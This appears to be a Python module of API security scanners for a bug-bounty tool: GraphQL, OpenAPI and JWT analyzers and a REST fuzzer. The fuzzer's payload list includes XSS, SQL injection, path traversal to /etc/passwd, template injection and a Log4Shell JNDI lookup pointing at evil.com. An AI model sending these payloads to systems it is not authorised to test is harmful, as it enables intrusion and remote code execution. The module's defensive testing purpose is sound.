"""API security testing module for BugBounty MCP."""

from typing import Any, Dict, List, Optional

from ..models import Severity, Vulnerability, VulnerabilityType
from ..utils import BaseTool, HTTPClient


class GraphQLScannerTool(BaseTool):
    """GraphQL security testing."""

    name = "graphqlscanner"
    description = "GraphQL security testing tool"

    async def run(
        self,
        endpoint: str,
        test_introspection: bool = True,
        query_depth: int = 10,
        test_mutations: bool = True,
        test_batching: bool = True,
    ) -> List[Vulnerability]:
        """Test GraphQL endpoint for vulnerabilities."""
        vulnerabilities = []

        async with HTTPClient(timeout=30) as client:
            # Test introspection
            if test_introspection:
                introspection_query = """
                {
                    __schema {
                        types {
                            name
                            fields {
                                name
                            }
                        }
                    }
                }
                """

                try:
                    response = await client.post(
                        endpoint,
                        json={"query": introspection_query},
                        headers={"Content-Type": "application/json"},
                    )

                    if response.status_code == 200:
                        data = response.json()
                        if "data" in data and data["data"]:
                            vulnerabilities.append(Vulnerability(
                                name="GraphQL Introspection Enabled",
                                type=VulnerabilityType.INFORMATION_DISCLOSURE,
                                severity=Severity.INFO,
                                target=endpoint,
                                url=endpoint,
                                description="GraphQL introspection is enabled, allowing discovery of schema",
                                poc=f"curl -X POST {endpoint} -H 'Content-Type: application/json' -d '{{\"query\": \"{{ __schema {{ types {{ name }} }} }}\"}}"',
                            ))
                except Exception as e:
                    self.logger.debug(f"Introspection test failed: {e}")

            # Test query depth limit
            if query_depth > 0:
                depth_query = "{" + " ".join([f"__typename" for _ in range(query_depth)]) + "}"
                try:
                    response = await client.post(
                        endpoint,
                        json={"query": depth_query},
                        headers={"Content-Type": "application/json"},
                    )

                    if response.status_code == 200:
                        vulnerabilities.append(Vulnerability(
                            name="GraphQL No Query Depth Limiting",
                            type=VulnerabilityType.BUSINESS_LOGIC,
                            severity=Severity.HIGH,
                            target=endpoint,
                            url=endpoint,
                            description=f"GraphQL endpoint accepts deeply nested queries (depth: {query_depth}) without depth limiting",
                            remediation="Implement query depth limiting in GraphQL server",
                        ))
                except Exception:
                    pass

            # Test mutations without authentication
            if test_mutations:
                mutation_tests = [
                    ("introspection query", """
                    mutation {
                        __typename
                    }
                    """),
                ]

                for name, mutation in mutation_tests:
                    try:
                        response = await client.post(
                            endpoint,
                            json={"query": mutation},
                            headers={"Content-Type": "application/json"},
                        )

                        if response.status_code == 200:
                            data = response.json()
                            if "errors" not in data or not any(
                                "auth" in str(e).lower()
                                for e in data.get("errors", [])
                            ):
                                vulnerabilities.append(Vulnerability(
                                    name="GraphQL Mutation Without Auth",
                                    type=VulnerabilityType.AUTHENTICATION,
                                    severity=Severity.MEDIUM,
                                    target=endpoint,
                                    url=endpoint,
                                    description=f"GraphQL mutation '{name}' may not require authentication",
                                ))
                    except Exception:
                        pass

        return vulnerabilities


class OpenAPIAnalyzerTool(BaseTool):
    """OpenAPI/Swagger specification analyzer."""

    name = "openapianalyzer"
    description = "Analyze OpenAPI specifications for security issues"

    async def run(
        self,
        spec_url: str,
    ) -> List[Vulnerability]:
        """Analyze an OpenAPI specification."""
        import json
        vulnerabilities = []

        async with HTTPClient(timeout=30) as client:
            try:
                response = await client.get(spec_url)

                if response.status_code != 200:
                    return vulnerabilities

                try:
                    spec = response.json()
                except Exception:
                    return vulnerabilities

                # Check for common security issues in OpenAPI specs
                paths = spec.get("paths", {})

                for path, methods in paths.items():
                    for method, details in methods.items():
                        if method.upper() in ["GET", "POST", "PUT", "DELETE", "PATCH"]:
                            # Check for missing authentication
                            security = details.get("security", spec.get("security", []))
                            if not security:
                                vulnerabilities.append(Vulnerability(
                                    name=f"Missing Authentication: {method.upper()} {path}",
                                    type=VulnerabilityType.AUTHENTICATION,
                                    severity=Severity.MEDIUM,
                                    target=spec_url,
                                    url=f"{spec_url}#{method.upper()}_{path.replace('/', '_')}",
                                    description=f"Endpoint {method.upper()} {path} does not specify authentication requirements",
                                ))

                            # Check for sensitive data in parameters
                            params = details.get("parameters", [])
                            for param in params:
                                param_name = param.get("name", "").lower()
                                if any(
                                    keyword in param_name
                                    for keyword in ["password", "secret", "token", "key"]
                                ):
                                    if param.get("in") == "query" or param.get("in") == "header":
                                        vulnerabilities.append(Vulnerability(
                                            name=f"Sensitive Data in {param.get('in').upper()}: {param_name}",
                                            type=VulnerabilityType.INFORMATION_DISCLOSURE,
                                            severity=Severity.INFO,
                                            target=spec_url,
                                            url=f"{spec_url}#{method.upper()}_{path.replace('/', '_')}",
                                            description=f"Sensitive parameter '{param_name}' passed in {param.get('in')}",
                                        ))

            except Exception as e:
                self.logger.debug(f"OpenAPI analysis failed: {e}")

        return vulnerabilities


class JWTAnalyzerTool(BaseTool):
    """JWT token analyzer."""

    name = "jwtanalyzer"
    description = "Analyze JWT tokens for security issues"

    async def run(
        self,
        token: str,
        target_url: Optional[str] = None,
    ) -> List[Vulnerability]:
        """Analyze a JWT token for vulnerabilities."""
        import base64
        import json
        vulnerabilities = []

        try:
            # Split token into parts
            parts = token.split(".")
            if len(parts) != 3:
                return vulnerabilities

            # Decode header
            header = json.loads(
                base64.urlsafe_b64decode(
                    parts[0] + "=" * (4 - len(parts[0]) % 4)
                )
            )

            # Decode payload
            payload = json.loads(
                base64.urlsafe_b64decode(
                    parts[1] + "=" * (4 - len(parts[1]) % 4)
                )
            )

            # Check algorithm
            alg = header.get("alg", "")
            if alg in ["none", "None", "NONE"]:
                vulnerabilities.append(Vulnerability(
                    name="JWT Algorithm 'none'",
                    type=VulnerabilityType.OTHER,
                    severity=Severity.CRITICAL,
                    target=target_url or "unknown",
                    description="JWT token uses 'none' algorithm, allowing signature bypass",
                    remediation="Use a secure algorithm like RS256 or ES256",
                ))

            # Check for weak algorithms
            weak_algs = ["HS256", "HS384", "HS512"]
            if alg in weak_algs:
                vulnerabilities.append(Vulnerability(
                    name="JWT Weak Algorithm",
                    type=VulnerabilityType.OTHER,
                    severity=Severity.MEDIUM,
                    target=target_url or "unknown",
                    description=f"JWT uses symmetric algorithm {alg}, which may be vulnerable if server secret is weak",
                    remediation="Use asymmetric algorithms like RS256 or ES256",
                ))

            # Check token expiration
            exp = payload.get("exp")
            if not exp:
                vulnerabilities.append(Vulnerability(
                    name="JWT No Expiration",
                    type=VulnerabilityType.OTHER,
                    severity=Severity.MEDIUM,
                    target=target_url or "unknown",
                    description="JWT token has no expiration claim",
                    remediation="Add 'exp' claim to token",
                ))

            # Check for sensitive data in payload
            sensitive_keys = ["password", "secret", "key", "token", "credential"]
            for key in sensitive_keys:
                if key in payload:
                    vulnerabilities.append(Vulnerability(
                        name=f"JWT Contains Sensitive Data: {key}",
                        type=VulnerabilityType.INFORMATION_DISCLOSURE,
                        severity=Severity.HIGH,
                        target=target_url or "unknown",
                        description=f"JWT payload contains sensitive key '{key}'",
                    ))

        except Exception as e:
            self.logger.debug(f"JWT analysis failed: {e}")

        return vulnerabilities


class RESTAPIFuzzerTool(BaseTool):
    """REST API fuzzer."""

    name = "restfuzzer"
    description = "Fuzz REST API endpoints"

    async def run(
        self,
        base_url: str,
        endpoints: List[Dict[str, Any]],
        fuzz_params: bool = True,
        fuzz_headers: bool = False,
    ) -> List[Vulnerability]:
        """Fuzz REST API endpoints."""
        import random
        import string

        vulnerabilities = []

        fuzz_values = [
            "",
            " ",
            "<script>alert(1)</script>",
            "' OR '1'='1",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "null",
            "undefined",
            "NaN",
            "Infinity",
            "[]",
            "{}",
            "9999999999",
            "-1",
            "0" * 1000,
        ]

        async with HTTPClient(timeout=30) as client:
            for endpoint in endpoints:
                method = endpoint.get("method", "GET").upper()
                path = endpoint.get("path", "/")
                url = f"{base_url.rstrip('/')}/{path.lstrip('/')}"

                headers = endpoint.get("headers", {})
                data = endpoint.get("data")

                # Fuzz parameters
                if fuzz_params:
                    params = endpoint.get("params", {})
                    for param_name, param_value in params.items():
                        for fuzz_value in fuzz_values[:5]:  # Limit fuzz attempts
                            test_params = {param_name: fuzz_value}

                            try:
                                if method == "GET":
                                    response = await client.get(
                                        url, params=test_params, headers=headers
                                    )
                                else:
                                    response = await client.request(
                                        method, url, params=test_params,
                                        json=data, headers=headers
                                    )

                                # Check for interesting responses
                                if response.status_code >= 500:
                                    vulnerabilities.append(Vulnerability(
                                        name="Potential Server Error",
                                        type=VulnerabilityType.OTHER,
                                        severity=Severity.MEDIUM,
                                        target=url,
                                        url=url,
                                        description=f"Endpoint returned {response.status_code} with fuzzed parameter",
                                        poc=f"curl -X {method} '{url}?{param_name}={fuzz_value}'",
                                    ))

                                # Check for information disclosure
                                if any(
                                    keyword in response.text.lower()
                                    for keyword in ["error", "exception", "stack", "trace"]
                                ):
                                    vulnerabilities.append(Vulnerability(
                                        name="Error Information Disclosure",
                                        type=VulnerabilityType.INFORMATION_DISCLOSURE,
                                        severity=Severity.INFO,
                                        target=url,
                                        url=url,
                                        description="Endpoint may leak error information",
                                    ))

                            except Exception as e:
                                self.logger.debug(f"Fuzz request failed: {e}")

        return vulnerabilities
